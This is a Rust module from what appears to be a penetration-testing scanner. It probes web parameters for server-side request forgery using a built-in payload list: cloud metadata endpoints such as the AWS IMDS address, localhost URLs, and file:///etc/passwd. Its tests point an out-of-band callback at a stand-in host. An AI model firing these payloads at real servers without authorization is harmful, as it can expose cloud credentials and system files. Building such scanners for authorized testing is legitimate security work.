//! ssrf — Server-Side Request Forgery (best-effort black-box).
//!
//! True SSRF confirmation needs an out-of-band listener you control. This
//! module does the in-band part: it targets likely-fetch params, sends
//! internal/metadata URLs, and flags when internal content is reflected
//! back or behavior clearly changes. Set `opts.ssrf_callback` to a URL you
//! monitor for OOB confirmation. Port of `checks/ssrf.py`.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, HttpResponse, Severity};
use std::sync::LazyLock;
use std::time::Duration;

pub const NAME: &str = "ssrf";

const FETCH_PARAMS: &[&str] = &[
    "url", "uri", "link", "src", "source", "dest", "destination", "redirect", "redirect_uri", "target", "path",
    "continue", "feed", "host", "site", "domain", "callback", "webhook", "image", "img", "load",
];

// Tokens that appear only in FETCHED content, never in the request URL
// itself (so reflecting the payload back does NOT trigger a false positive).
static METADATA_MARKERS: LazyLock<regex::Regex> =
    LazyLock::new(|| regex::Regex::new(r"(?i)(ami-id|instance-id|iam/security-credentials|instance-identity|root:.*:0:0:)").unwrap());

fn payloads(callback: &Option<String>) -> Vec<String> {
    let mut p = vec![
        "http://169.254.169.254/latest/meta-data/".to_string(), // AWS IMDS
        "http://metadata.google.internal/computeMetadata/v1/".to_string(), // GCP
        "http://127.0.0.1:80/".to_string(),
        "http://localhost/".to_string(),
        "file:///etc/passwd".to_string(),
        "http://[::1]/".to_string(),
    ];
    if let Some(cb) = callback {
        p.insert(0, cb.clone());
    }
    p
}

async fn send(client: &HttpClient, method: &str, param: &str, val: &str) -> Option<HttpResponse> {
    let req = if method == "GET" { HttpRequest::get().param(param, val) } else { HttpRequest::post().form_field(param, val) };
    client.request(req).await.ok()
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let method = opts.method.to_uppercase();
    let callback = opts.ssrf_callback.clone();

    let mut params: Vec<&str> = Vec::new();
    if let Some(p) = &opts.param {
        params.push(p.as_str());
    }
    params.extend(FETCH_PARAMS.iter().filter(|p| Some(**p) != opts.param.as_deref()));

    let mut out = Vec::new();
    for &param in params.iter().take(6) {
        let Some(baseline) = send(client, &method, param, "http://example.com/").await else { continue };
        for pl in payloads(&callback) {
            let Some(r) = send(client, &method, param, &pl).await else { continue };
            if let Some(m) = METADATA_MARKERS.find(&r.body) {
                if !pl.contains(m.as_str()) {
                    out.push(
                        Finding::new(NAME, Severity::Critical, "SSRF — internal content reflected", format!("param '{param}' fetched {pl}"))
                            .with_evidence(m.as_str().to_string()),
                    );
                    return out;
                }
            }
            if let Some(cb) = &callback {
                if &pl == cb {
                    out.push(
                        Finding::new(NAME, Severity::High, "Possible SSRF — check your OOB listener", format!("param '{param}' sent to your callback {cb}"))
                            .with_evidence("confirm the hit landed on your listener"),
                    );
                }
            }
        }
        // timing heuristic only: fetching an unroutable internal port stalls
        // the server. Length diffs are unreliable (apps echo the URL), so
        // we ignore them.
        if let Some(r_int) = send(client, &method, param, "http://127.0.0.1:1/").await {
            if r_int.elapsed > baseline.elapsed + Duration::from_secs(3) && !r_int.body.contains("127.0.0.1:1") {
                out.push(
                    Finding::new(NAME, Severity::Medium, "Param may drive server-side fetch (SSRF surface)", format!("param '{param}' stalled on an internal address; verify manually"))
                        .with_evidence(format!("int={:.1}s vs ext={:.1}s", r_int.elapsed.as_secs_f64(), baseline.elapsed.as_secs_f64())),
                );
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        HttpClient::new(base_url, HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() })
    }

    #[tokio::test]
    async fn detects_reflected_metadata_content() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("url").cloned().unwrap_or_default();
            if v.contains("169.254.169.254") {
                ScriptedResponse::ok("ami-id\ninstance-id\n")
            } else {
                ScriptedResponse::ok("fetched: nothing interesting")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("url".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.iter().any(|f| f.title == "SSRF — internal content reflected"));
    }

    #[tokio::test]
    async fn does_not_flag_a_metadata_marker_that_is_only_the_reflected_payload() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("url").cloned().unwrap_or_default();
            ScriptedResponse::ok(format!("you requested: {v}"))
        })
        .await;
        let client = fast_client(base);
        let opts = Opts { param: Some("url".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn reports_possible_ssrf_when_callback_payload_is_sent() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let opts = Opts { param: Some("url".to_string()), ssrf_callback: Some("http://collab.test/tok1".to_string()), ..Opts::default() };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.iter().any(|f| f.title == "Possible SSRF — check your OOB listener"));
    }
}
